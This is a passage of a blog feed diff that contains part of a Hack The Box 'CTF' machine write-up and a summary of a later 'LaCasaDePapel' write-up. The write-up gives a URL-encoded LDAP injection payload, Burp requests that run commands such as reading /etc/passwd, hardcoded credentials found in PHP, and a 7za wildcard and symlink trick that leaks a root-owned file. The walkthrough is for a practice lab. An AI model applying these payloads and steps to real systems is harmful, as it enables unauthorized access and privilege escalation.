-&lt;br /&gt; I didn’t type any password I left it blank. We can either use the &lt;code class=&quot;highlighter-rouge&quot;&gt;cli&lt;/code&gt; or the &lt;code class=&quot;highlighter-rouge&quot;&gt;gui&lt;/code&gt;, for the &lt;code class=&quot;highlighter-rouge&quot;&gt;cli&lt;/code&gt; you have to start &lt;code class=&quot;highlighter-rouge&quot;&gt;stoken&lt;/code&gt; and enter the pin then you will get the &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt;, and for another &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt; you’ll need to start &lt;code class=&quot;highlighter-rouge&quot;&gt;stoken&lt;/code&gt; again.
-&lt;img src=&quot;/images/hackthebox/ctf/11.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt; So I just used the &lt;code class=&quot;highlighter-rouge&quot;&gt;gui&lt;/code&gt; as it’s better :
-&lt;img src=&quot;/images/hackthebox/ctf/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;rce-user-flag&quot;&gt;RCE, User Flag&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt; Let’s login and see what’s there :
-&lt;img src=&quot;/images/hackthebox/ctf/13.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;%2a%29%28uid%3d%2a%29%29%28%7c%28uid%3d%2a&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;*)(uid=*))(|(uid=*&lt;/code&gt; url-encoded.
-&lt;br /&gt; It redirected me to &lt;code class=&quot;highlighter-rouge&quot;&gt;/page.php&lt;/code&gt; which I can use to execute commands :
-&lt;img src=&quot;/images/hackthebox/ctf/14.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt; I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;whoami&lt;/code&gt; and it worked fine:
-&lt;img src=&quot;/images/hackthebox/ctf/15.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt; I switched to burp to make things easier, I wanted to read &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; to know the users :
-&lt;br /&gt; Request :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /page.php HTTP/1.1
-Host: ctf.htb
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://ctf.htb/page.php
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 42
-Cookie: PHPSESSID=jj0dlekfhl2pggbo50bg4dkeu0
-Connection: close
-Upgrade-Insecure-Requests: 1
-
-inputCmd=cat /etc/passwd&amp;amp;inputOTP=52447058
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; Response :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
-Date: Fri, 19 Jul 2019 21:58:13 GMT
-Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
-X-Powered-By: PHP/5.4.16
-Expires: Thu, 19 Nov 1981 08:52:00 GMT
-Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
-Pragma: no-cache
-Content-Length: 4005
-Connection: close
-Content-Type: text/html; charset=UTF-8
-
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;lang=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;en&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
-        ----------------
-         Removed Output
-        ----------------
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;pre&amp;gt;&lt;/span&gt;root:x:0:0:root:/root:/bin/bash
-bin:x:1:1:bin:/bin:/sbin/nologin
-daemon:x:2:2:daemon:/sbin:/sbin/nologin
-adm:x:3:4:adm:/var/adm:/sbin/nologin
-lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
-sync:x:5:0:sync:/sbin:/bin/sync
-shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
-halt:x:7:0:halt:/sbin:/sbin/halt
-mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
-operator:x:11:0:operator:/root:/sbin/nologin
-games:x:12:100:games:/usr/games:/sbin/nologin
-ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
-nobody:x:99:99:Nobody:/:/sbin/nologin
-systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
-dbus:x:81:81:System message bus:/:/sbin/nologin
-polkitd:x:999:998:User for polkitd:/:/sbin/nologin
-apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
-libstoragemgmt:x:998:997:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
-abrt:x:173:173::/etc/abrt:/sbin/nologin
-rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
-sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
-postfix:x:89:89::/var/spool/postfix:/sbin/nologin
-ntp:x:38:38::/etc/ntp:/sbin/nologin
-chrony:x:997:995::/var/lib/chrony:/sbin/nologin
-tcpdump:x:72:72::/:/sbin/nologin
-ldap:x:55:55:OpenLDAP server:/var/lib/ldap:/sbin/nologin
-saslauth:x:996:76:Saslauthd user:/run/saslauthd:/sbin/nologin
-ldapuser:x:1000:1000::/home/ldapuser:/bin/bash
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/pre&amp;gt;&lt;/span&gt;
-        ----------------
-         Removed Output
-        ----------------
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; We can see that &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser&lt;/code&gt; is an actual user on the box, I tried to get a reverse shell but for some reason I couldn’t get a reverse shell at all so I started to look in the web files. I was already in the web directory :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;inputCmd=pwd&amp;amp;inputOTP=14546713
-
-/var/www/html
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; I listed the files :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;inputCmd=ls -la&amp;amp;inputOTP=14546713
-
-total 36
-drwxr-xr-x. 6 root   root    176 Oct 23  2018 .
-drwxr-xr-x. 4 root   root     33 Jun 27  2018 ..
--rw-r--r--. 1 root   root      0 Jul 20 00:03 banned.txt
--rw-r-----. 1 root   apache 1424 Oct 23  2018 cover.css
-drwxr-x--x. 2 root   apache 4096 Oct 23  2018 css
-drwxr-x--x. 4 root   apache   27 Oct 23  2018 dist
--rw-r-----. 1 root   apache 2592 Oct 23  2018 index.html
-drwxr-x--x. 2 root   apache  242 Oct 23  2018 js
--rw-r-----. 1 root   apache 5021 Oct 23  2018 login.php
--rw-r-----. 1 root   apache   68 Oct 23  2018 logout.php
--rw-r-----. 1 root   apache 5245 Oct 23  2018 page.php
--rw-r-----. 1 root   apache 2324 Oct 23  2018 status.php
-drwxr-x--x. 2 apache apache    6 Oct 23  2018 uploads
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; I started looking for any hardcoded credentials in the &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; files, in &lt;code class=&quot;highlighter-rouge&quot;&gt;login.php&lt;/code&gt; I found credentials for &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;inputCmd=cat login.php&amp;amp;inputOTP=04181897
-
-&amp;lt;?php
-session_start();
-$strErrorMsg=&quot;&quot;;
-
-$username = 'ldapuser';
-$password = 'e398e27d5c4ad45086fe431120932a01';
-
-$basedn = 'dc=ctf,dc=htb';
-$usersdn = 'cn=users';
-
-// This code uses the START_TLS command
-
-$ldaphost = &quot;ldap://ctf.htb&quot;;
-$ldapUsername  = &quot;cn=$username&quot;;
-
-$ds = ldap_connect($ldaphost);
-$dn = &quot;uid=ldapuser,ou=People,dc=ctf,dc=htb&quot;;
-
-if (!empty($_POST))
-{
-    //var_dump($_POST);
-    $username1 = $_POST['inputUsername'];
-    $OPT1 = $_POST['inputOTP'];
-
-    $regex='/[()*&amp;amp;|!=&amp;gt;&amp;lt;~]/';
-
-    if (!preg_match($regex, $username1)) {
-        $username2 = urldecode($username1);
-
-        if(!ldap_set_option($ds, LDAP_OPT_PROTOCOL_VERSION, 3)){
-            print &quot;Could not set LDAPv3\r\n&quot;;
-        }
-        else if (!ldap_start_tls($ds)) {
-           print &quot;Could not start secure TLS connection&quot;;
-        }
-        else {
-            // now we need to bind to the ldap server
-            $bth = ldap_bind($ds, $dn, $password) or die(&quot;\r\nCould not connect to LDAP server\r\n&quot;);
-
-            $filter = &quot;(&amp;amp;(objectClass=inetOrgPerson)(uid=$username2))&quot;;
-            // fix to be sure that the user has a token string in the db. Without it you can bypass the OTP check with no token in the input form!
-            $filter = &quot;(&amp;amp;(&amp;amp;(objectClass=inetOrgPerson)(uid=$username2))(pager=*))&quot;;
-            //echo $filter.PHP_EOL;
-            if ($search=@ldap_search($ds, $basedn, $filter)) {
-                $info = ldap_get_entries($ds, $search);
-
-                if($info[&quot;count&quot;] &amp;gt; 0) {
-                    $token_string = $info[0]['pager'][0];
-                    //echo $token_string;
-                    $token = exec(&quot;/usr/bin/stoken --token=$token_string --pin=0000&quot;);
-                    if($token == $OPT1) {
-                        $strErrorMsg = &quot;Login ok&quot;;
-                        $_SESSION['username'] = $username1;
-                        header ('Location: /page.php');
-                    }
-                    else {
-                        $strErrorMsg = &quot;Cannot login&quot;;
-                    }
-                }
-                else {
-                    $strErrorMsg = &quot;User $username1 not found&quot;;
-                }
-            }
-        }
-    }
-}
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; ` ldapuser : e398e27d5c4ad45086fe431120932a01&lt;code class=&quot;highlighter-rouge&quot;&gt;
-&amp;lt;br&amp;gt; &lt;/code&gt;ssh` :
-&lt;img src=&quot;/images/hackthebox/ctf/16.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt; We owned user.
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;7z-list-files-and-wildcards-root-flag&quot;&gt;7z List Files and Wildcards, Root Flag&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt; Before enumerating anything I just checked the directories and stuff like that, in &lt;code class=&quot;highlighter-rouge&quot;&gt;/&lt;/code&gt; I saw a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;backup&lt;/code&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[ldapuser@ctf /]$ ls -al
-total 32
-dr-xr-xr-x.  18 root root  238 Jul 31  2018 .
-dr-xr-xr-x.  18 root root  238 Jul 31  2018 ..
-drwxr-xr-x.   2 root root 4096 Jul 20 00:07 backup
-lrwxrwxrwx.   1 root root    7 Jul 30  2018 bin -&amp;gt; usr/bin
-dr-xr-xr-x.   5 root root 4096 Oct 16  2018 boot
-drwxr-xr-x.  20 root root 3180 Jul 19 23:34 dev
-drwxr-xr-x.  90 root root 8192 Dec  9  2018 etc
-drwxr-xr-x.   3 root root   22 Jul 30  2018 home
-lrwxrwxrwx.   1 root root    7 Jul 30  2018 lib -&amp;gt; usr/lib
-lrwxrwxrwx.   1 root root    9 Jul 30  2018 lib64 -&amp;gt; usr/lib64
-drwxr-xr-x.   2 root root    6 Apr 11  2018 media
-drwxr-xr-x.   2 root root    6 Apr 11  2018 mnt
-drwxr-xr-x.   3 root root   16 Jul 30  2018 opt
-dr-xr-xr-x. 119 root root    0 Jul 19 23:33 proc
-dr-xr-x---.   7 root root 4096 Dec  9  2018 root
-drwxr-xr-x.  31 root root  920 Jul 19 23:34 run
-lrwxrwxrwx.   1 root root    8 Jul 30  2018 sbin -&amp;gt; usr/sbin
-drwxr-xr-x.   2 root root    6 Apr 11  2018 srv
-dr-xr-xr-x.  13 root root    0 Jul 19 23:34 sys
-drwxrwxrwt.  10 root root 4096 Jul 20 00:06 tmp
-drwxr-xr-x.  13 root root  155 Jul 30  2018 usr
-drwxr-xr-x.  21 root root 4096 Jul 30  2018 var
-[ldapuser@ctf /]$ 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; It had a lot of archives, an error log and a script called &lt;code class=&quot;highlighter-rouge&quot;&gt;honeypot.sh&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[ldapuser@ctf backup]$ ls -al
-total 52
-drwxr-xr-x.  2 root root 4096 Jul 20 00:07 .
-dr-xr-xr-x. 18 root root  238 Jul 31  2018 ..
--rw-r--r--.  1 root root   32 Jul 19 23:57 backup.1563573421.zip
--rw-r--r--.  1 root root   32 Jul 19 23:58 backup.1563573481.zip
--rw-r--r--.  1 root root   32 Jul 19 23:59 backup.1563573541.zip
--rw-r--r--.  1 root root   32 Jul 20 00:00 backup.1563573602.zip
--rw-r--r--.  1 root root   32 Jul 20 00:01 backup.1563573661.zip
--rw-r--r--.  1 root root   32 Jul 20 00:02 backup.1563573721.zip
--rw-r--r--.  1 root root   32 Jul 20 00:03 backup.1563573781.zip
--rw-r--r--.  1 root root   32 Jul 20 00:04 backup.1563573841.zip
--rw-r--r--.  1 root root   32 Jul 20 00:05 backup.1563573901.zip
--rw-r--r--.  1 root root   32 Jul 20 00:06 backup.1563573961.zip
--rw-r--r--.  1 root root   32 Jul 20 00:07 backup.1563574022.zip
--rw-r--r--.  1 root root    0 Jul 20 00:07 error.log
--rwxr--r--.  1 root root  975 Oct 23  2018 honeypot.sh
-[ldapuser@ctf backup]$ 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;honeypot.sh&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[ldapuser@ctf backup]$ cat honeypot.sh 
-# get banned ips from fail2ban jails and update banned.txt
-# banned ips directily via firewalld permanet rules are **not** included in the list (they get kicked for only 10 seconds)
-/usr/sbin/ipset list | grep fail2ban -A 7 | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u &amp;gt; /var/www/html/banned.txt
-# awk '$1=$1' ORS='&amp;lt;br&amp;gt;' /var/www/html/banned.txt &amp;gt; /var/www/html/testfile.tmp &amp;amp;&amp;amp; mv /var/www/html/testfile.tmp /var/www/html/banned.txt
-
-# some vars in order to be sure that backups are protected
-now=$(date +&quot;%s&quot;)
-filename=&quot;backup.$now&quot;
-pass=$(openssl passwd -1 -salt 0xEA31 -in /root/root.txt | md5sum | awk '{print $1}')
-
-# keep only last 10 backups
-cd /backup
-ls -1t *.zip | tail -n +11 | xargs rm -f
-
-# get the files from the honeypot and backup 'em all
-cd /var/www/html/uploads
-7za a /backup/$filename.zip -t7z -snl -p$pass -- *
-
-# cleaup the honeypot
-rm -rf -- *
-
-# comment the next line to get errors for debugging
-truncate -s 0 /backup/error.log
-[ldapuser@ctf backup]$ 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; Obviously this script runs from time to time to backup files, also it’s running as root. I didn’t check cronjobs or use &lt;code class=&quot;highlighter-rouge&quot;&gt;pspy&lt;/code&gt;, it was obvious since it’s accessing &lt;code class=&quot;highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt; to create the password and only root can access that.
-&lt;br /&gt; 	Basically one of the things that this script is doing is that it’s backing up all the files in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/uploads&lt;/code&gt; by using &lt;code class=&quot;highlighter-rouge&quot;&gt;7za&lt;/code&gt; to put all the uploads in one archive. Let’s look at the command again :
-&lt;code class=&quot;highlighter-rouge&quot;&gt;7za a /backup/$filename.zip -t7z -snl -p$pass -- *&lt;/code&gt;
-&lt;br /&gt; 	It’s using the wildcard asterisk (&lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt;) to get all files. This means that if we can write to &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/uploads&lt;/code&gt; our file will be included in the command. If we can create a malicious file name then we can somehow manipulate the &lt;code class=&quot;highlighter-rouge&quot;&gt;7za&lt;/code&gt; command. 
-&lt;br /&gt; It’s also using this option : &lt;code class=&quot;highlighter-rouge&quot;&gt;-snl&lt;/code&gt;, I checked the manual page for &lt;code class=&quot;highlighter-rouge&quot;&gt;7za&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;       -snl   Store symbolic links as links
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; Note that we can’t unzip the created backups, so even if we created a symlink to &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/uploads&lt;/code&gt; we won’t be able to read it because the archive is password protected. The only way to actually get anything is through the error log, we need to cause an error that somehow leaks the flag.
-&lt;br /&gt; After searching for some time I found &lt;a href=&quot;https://sevenzip.osdn.jp/chm/cmdline/syntax.htm&quot;&gt;this page&lt;/a&gt; which talks about a feature in &lt;code class=&quot;highlighter-rouge&quot;&gt;7z&lt;/code&gt; called list files. I thought if I created 2 files, &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;@root.txt&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; is a &lt;code class=&quot;highlighter-rouge&quot;&gt;symlink&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt;, when the command is executed and gets to &lt;code class=&quot;highlighter-rouge&quot;&gt;@root.txt&lt;/code&gt; it will treat that as a list file option then it will search for &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; to use it as a list file. However that file isn’t a real list file (that may cause an error), also it’s a &lt;code class=&quot;highlighter-rouge&quot;&gt;symlink&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt;. 
-&lt;br /&gt; I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/uploads&lt;/code&gt; and I didn’t even have read access.&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[ldapuser@ctf backup]$ cd /var/www/html/uploads/
-[ldapuser@ctf uploads]$ ls -al
-ls: cannot open directory .: Permission denied
-[ldapuser@ctf uploads]$ 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; so I went back to the &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; requests in burp and tried as &lt;code class=&quot;highlighter-rouge&quot;&gt;apache&lt;/code&gt;.
-&lt;br /&gt; I created a &lt;code class=&quot;highlighter-rouge&quot;&gt;symlink&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;inputCmd=ln -s /root/root.txt uploads/root.txt&amp;amp;inputOTP=91913130
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; Then I created an empty file and called it &lt;code class=&quot;highlighter-rouge&quot;&gt;@root.txt&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;inputCmd=touch uploads/@root.txt&amp;amp;inputOTP=91913130
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; Let’s check the directory listing now :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;inputCmd=ls -la uploads&amp;amp;inputOTP=91913130
-
-total 0
-drwxr-x--x. 2 apache apache  39 Jul 20 01:12 .
-drwxr-xr-x. 6 root   root   176 Oct 23  2018 ..
--rw-r--r--. 1 apache apache   0 Jul 20 01:12 @root.txt
-lrwxrwxrwx. 1 apache apache  14 Jul 20 01:12 root.txt -&amp;gt; /root/root.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; Everything is fine let’s check the error log :
-&lt;img src=&quot;/images/hackthebox/ctf/17.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt; And we owned root !
-&lt;br /&gt; That’s it , Feedback is appreciated !
-&lt;br /&gt; Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;
-&lt;br /&gt; Thanks for reading.
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt; Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/friendzone/&quot;&gt;Hack The Box - Friendzone&lt;/a&gt;
-&lt;br /&gt; Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/lacasadepapel/&quot;&gt;Hack The Box - LaCasaDePapel&lt;/a&gt;&lt;/p&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="linux" /><category term="web" /><category term="rce" /><category term="php" /><category term="ssh" /><category term="python" /><category term="exploit-development" /><category term="ldap" /><category term="code-analysis" /><summary type="html">Quick Summary Hey guys today CTF retired and here’s my write-up about it. CTF was a very cool box, it had an ldap injection vulnerability which I have never seen on another box before, and the way of exploiting that vulnerability to gain access was great. A really unique box, I had fun solving it and I hope you have fun too reading my write-up. It’s a Linux box and its ip is 10.10.10.122, I added it to /etc/hosts as ctf.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC ctf.htb Only http on port 80 and ssh on port 22 HTTP Initial Enumeration http://ctf.htb It’s pretty straightforward that we will get banned for 5 minutes if we tried to bruteforce anything, like sub directories for example. It’s also saying that they handle authentication with tokens, There’s a login page so let’s take a look at it. We need a username and an OTP (one-time password). An OTP is time limited which means that even if we could get a valid one it will give us access only once because it expires in a short time (usually 60 seconds). So we need to gain access to a place that generates valid OTPs or to be able to generate valid OTPs ourselves. Let’s take a look at the source code of the login page, maybe something is there : ``` &amp;lt;!doctype html&amp;gt;</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/ctf/0.png" /></entry></feed>
+&lt;hr /&gt;</content><author><name></name></author><category term="linux" /><category term="web" /><category term="ssh" /><category term="php" /><summary type="html">Quick Summary Hey guys today LaCasaDePapel retired and here’s my write-up about it. It was an easy interesting box, more of a ctf challenge than a realistic scenario but I still enjoyed it. It’s a Linux box and its ip is 10.10.10.131, I added it to /etc/hosts as lacasadepapel.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC lacasadepapel.htb We have http on port 80. https on port 443, ftp on port 21 and ssh on port 22. Anonymous authentication wasn’t allowed on ftp so I checked http and https : root@kali:~/Desktop/HTB/boxes/lacasadepapel# ftp lacasadepapel.htb Connected to lacasadepapel.htb. 220 (vsFTPd 2.3.4) Name (lacasadepapel.htb:root): anonymous 331 Please specify the password. Password: 530 Login incorrect. Login failed. ftp&amp;gt; HTTP http://lacasadepapel.htb We see an image of the characters from LaCasaDePapel (TV show) and a QR code for OTP, I scanned it with Google Authenticator on my phone : As you can see I had to refresh it manually while other tokens refreshed automatically, no idea why but anyway I took the OTP and used test@test.com as email : Then nothing happened, I just got the same page back again. I tried gobuster to see if I can find any sub directories and I didn’t get anything useful. Let’s check https. https://lacasadepapel.htb The same background with an error message saying : “Sorry, but you need to provide a client certificate to continue.” vsftpd 2.3.4, Psy Shell After hitting dead ends with web, I checked the ftp service again, the version was vsftpd 2.3.4 (from the nmap scan) so I searched for exploits : root@kali:~/Desktop/HTB/boxes/lacasadepapel# searchsploit vsftpd 2.3.4 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | exploits/unix/remote/17491.rb -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result Command Execution and there is a metasploit module for it, but the exploit didn’t work : ``` msf5 &amp;gt; search vsftpd 2.3.4</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/lacasadepapel/0.png" /></entry></feed>
